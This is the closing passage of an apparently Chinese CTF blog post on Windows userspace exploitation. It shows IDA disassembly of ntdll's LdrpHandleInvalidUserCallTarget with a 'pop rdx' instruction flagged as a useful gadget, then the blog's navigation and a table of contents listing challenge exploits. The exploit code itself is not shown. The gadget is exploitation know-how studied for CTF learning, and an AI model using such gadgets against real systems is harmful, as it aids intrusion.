RtlpHandleInvalidUserCallTarget</span><br><span class="line">.text:<span class="number">000000018008</span>C438                 movaps  xmm3, [rsp+<span class="number">0B</span>8h+var_68]</span><br><span class="line">.text:<span class="number">000000018008</span>C43D                 movaps  xmm2, [rsp+<span class="number">0B</span>8h+var_78]</span><br><span class="line">.text:<span class="number">000000018008</span>C442                 movaps  xmm1, [rsp+<span class="number">0B</span>8h+var_88]</span><br><span class="line">.text:<span class="number">000000018008</span>C447                 movaps  xmm0, [rsp+<span class="number">0B</span>8h+var_98]</span><br><span class="line">.text:<span class="number">000000018008</span>C44C                 mov     r10, [rsp+<span class="number">0B</span>8h+var_10]</span><br><span class="line">.text:<span class="number">000000018008</span>C454                 test    r10, r10</span><br><span class="line">.text:<span class="number">000000018008</span>C457                 jz      <span class="keyword">short</span> loc_18008C46E</span><br><span class="line">.text:<span class="number">000000018008</span>C459                 add     rsp, <span class="number">80</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C460                 pop     rax</span><br><span class="line">.text:<span class="number">000000018008</span>C461                 pop     rdx</span><br><span class="line">.text:<span class="number">000000018008</span>C462                 pop     rcx</span><br><span class="line">.text:<span class="number">000000018008</span>C463                 pop     r8</span><br><span class="line">.text:<span class="number">000000018008</span>C465                 pop     r9</span><br><span class="line">.text:<span class="number">000000018008</span>C467                 pop     r10</span><br><span class="line">.text:<span class="number">000000018008</span>C469                 pop     r11</span><br><span class="line">.text:<span class="number">000000018008</span>C46B                 jmp     rax</span><br><span class="line">.text:<span class="number">000000018008</span>C46E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000018008</span>C46E</span><br><span class="line">.text:<span class="number">000000018008</span>C46E loc_18008C46E:                          ; CODE XREF: LdrpHandleInvalidUserCallTarget+<span class="number">57</span>↑j</span><br><span class="line">.text:<span class="number">000000018008</span>C46E                 movaps  xmm5, [rsp+<span class="number">0B</span>8h+var_48]</span><br><span class="line">.text:<span class="number">000000018008</span>C473                 movaps  xmm4, [rsp+<span class="number">0B</span>8h+var_58]</span><br><span class="line">.text:<span class="number">000000018008</span>C478                 add     rsp, <span class="number">80</span>h</span><br><span class="line">.text:<span class="number">000000018008</span>C47F                 pop     rax       </span><br><span class="line">.text:<span class="number">000000018008</span>C480                 pop     rdx          <span class="comment">// &lt;== here!!!</span></span><br><span class="line">.text:<span class="number">000000018008</span>C481                 pop     rcx</span><br><span class="line">.text:<span class="number">000000018008</span>C482                 pop     r8</span><br><span class="line">.text:<span class="number">000000018008</span>C484                 pop     r9</span><br><span class="line">.text:<span class="number">000000018008</span>C486                 pop     r10</span><br><span class="line">.text:<span class="number">000000018008</span>C488                 pop     r11</span><br><span class="line">.text:<span class="number">000000018008</span>C48A                 retn</span><br><span class="line">.text:<span class="number">000000018008</span>C48A LdrpHandleInvalidUserCallTarget endp</span><br></pre></td></tr></table></figure>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>打赏还是打残，这是个问题</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/weichat.png" alt=" 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt=" 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://xiaoxiaorenwu.top/2020/05/05/Windows_Userspace_Pwn学习/" title="Windows_Userspace_Pwn学习">https://xiaoxiaorenwu.top/2020/05/05/Windows_Userspace_Pwn学习/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/WP/" rel="tag"><i class="fa fa-tag"></i> WP</a>
          
            <a href="/tags/Windows-Userspace-Pwn学习/" rel="tag"><i class="fa fa-tag"></i> Windows_Userspace_Pwn学习</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/05/01/虚拟机逃逸初识/" rel="next" title="虚拟机逃逸初识">
                <i class="fa fa-chevron-left"></i> 虚拟机逃逸初识
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/05/05/杂物3/" rel="prev" title="杂物3">
                杂物3 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/xxrw.jpg" alt="">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description">Babypwner@Dubhe@BUPT</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">53</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">23</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/xiaoxiaorenwu" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:renwuxiaoxiao@126.com" target="_blank" title="E-mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                大佬们的blog~~
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top" title="p4nda" target="_blank">p4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="sunichi" target="_blank">sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://e3pem.github.io/" title="e3pem" target="_blank">e3pem</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hpasserby.me/" title="hpasserby" target="_blank">hpasserby</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ama2in9.top/" title="ama2in9" target="_blank">ama2in9</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://t3ls.club/" title="T3LS" target="_blank">T3LS</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hitbgsec-babystack"><span class="nav-number">1.</span> <span class="nav-text">hitbgsec_babystack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路："><span class="nav-number">1.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp："><span class="nav-number">1.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019第五空间决赛-九果"><span class="nav-number">2.</span> <span class="nav-text">2019第五空间决赛_九果</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019SUCTF-babystack"><span class="nav-number">3.</span> <span class="nav-text">2019SUCTF_babystack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-1"><span class="nav-number">3.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-1"><span class="nav-number">3.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019OGeek-babyheap"><span class="nav-number">4.</span> <span class="nav-text">2019OGeek_babyheap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-2"><span class="nav-number">4.1.</span> <span class="nav-text">思路：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Re："><span class="nav-number">4.1.1.</span> <span class="nav-text">Re：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn："><span class="nav-number">4.1.2.</span> <span class="nav-text">Pwn：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-2"><span class="nav-number">4.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019Hitcon-dadadb"><span class="nav-number">5.</span> <span class="nav-text">2019Hitcon_dadadb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-3"><span class="nav-number">5.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-3"><span class="nav-number">5.2.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell-exp："><span class="nav-number">5.3.</span> <span class="nav-text">getshell_exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#官方exp："><span class="nav-number">5.4.</span> <span class="nav-text">官方exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反思与收获："><span class="nav-number">5.5.</span> <span class="nav-text">反思与收获：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019WCTF-LazyFragmentationHeap"><span class="nav-number">6.</span> <span class="nav-text">2019WCTF_LazyFragmentationHeap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#myexp："><span class="nav-number">6.1.</span> <span class="nav-text">myexp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#官方exp：-1"><span class="nav-number">6.2.</span> <span class="nav-text">官方exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#winpwn1"><span class="nav-number">7.</span> <span class="nav-text">winpwn1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-4"><span class="nav-number">7.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-4"><span class="nav-number">7.2.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#orw-exp："><span class="nav-number">7.3.</span> <span class="nav-text">orw_exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#winpwn2"><span class="nav-number">8.</span> <span class="nav-text">winpwn2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020SCTF-EasyWinHeap"><span class="nav-number">9.</span> <span class="nav-text">2020SCTF_EasyWinHeap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-5"><span class="nav-number">9.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#myexp：-1"><span class="nav-number">9.2.</span> <span class="nav-text">myexp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation-in-Windows"><span class="nav-number">10.</span> <span class="nav-text">Exploitation in Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BackEnd-Unlink"><span class="nav-number">10.1.</span> <span class="nav-text">BackEnd-Unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#关于unlink的实验："><span class="nav-number">10.1.1.</span> <span class="nav-text">关于unlink的实验：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#在HeapFree中触发unlink："><span class="nav-number">10.1.1.1.</span> <span class="nav-text">在HeapFree中触发unlink：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#x64"><span class="nav-number">10.1.1.1.1.</span> <span class="nav-text">x64</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x86"><span class="nav-number">10.1.1.1.2.</span> <span class="nav-text">x86</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在HeapAlloc中触发unlink"><span class="nav-number">10.1.1.2.</span> <span class="nav-text">在HeapAlloc中触发unlink:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#x64-1"><span class="nav-number">10.1.1.2.1.</span> <span class="nav-text">x64</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x86-1"><span class="nav-number">10.1.1.2.2.</span> <span class="nav-text">x86</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FrontEnd-UAF"><span class="nav-number">10.2.</span> <span class="nav-text">FrontEnd-UAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#关于LFH的实验："><span class="nav-number">10.2.1.</span> <span class="nav-text">关于LFH的实验：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#需要注意的点"><span class="nav-number">10.2.1.1.</span> <span class="nav-text">需要注意的点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码"><span class="nav-number">10.2.1.2.</span> <span class="nav-text">代码</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#出题笔记"><span class="nav-number">11.</span> <span class="nav-text">出题笔记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于调试"><span class="nav-number">12.</span> <span class="nav-text">关于调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于泄露"><span class="nav-number">13.</span> <span class="nav-text">关于泄露</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#笔记"><span class="nav-number">14.</span> <span class="nav-text">笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#windbg使用笔记"><span class="nav-number">14.1.</span> <span class="nav-text">windbg使用笔记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于交互"><span class="nav-number">14.2.</span> <span class="nav-text">关于交互</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#资料"><span class="nav-number">14.3.</span> <span class="nav-text">资料</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ntdll-RtlCaptureContext"><span class="nav-number">14.4.</span> <span class="nav-text">ntdll!RtlCaptureContext</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#杂谈"><span class="nav-number">14.5.</span> <span class="nav-text">杂谈</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
  </script>
  
    <span class="site-uv">
      访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'wQR3fxNYiFB3Sh2MdPvjK8ez-gzGzoHsz',
        appKey: 'M81KRpr3NUHCSrwBJ9TY73HF',
        placeholder: '欢乐时光就要开始了',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  



   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/src/fireworks.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

<!-- ҳ����С���� -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>

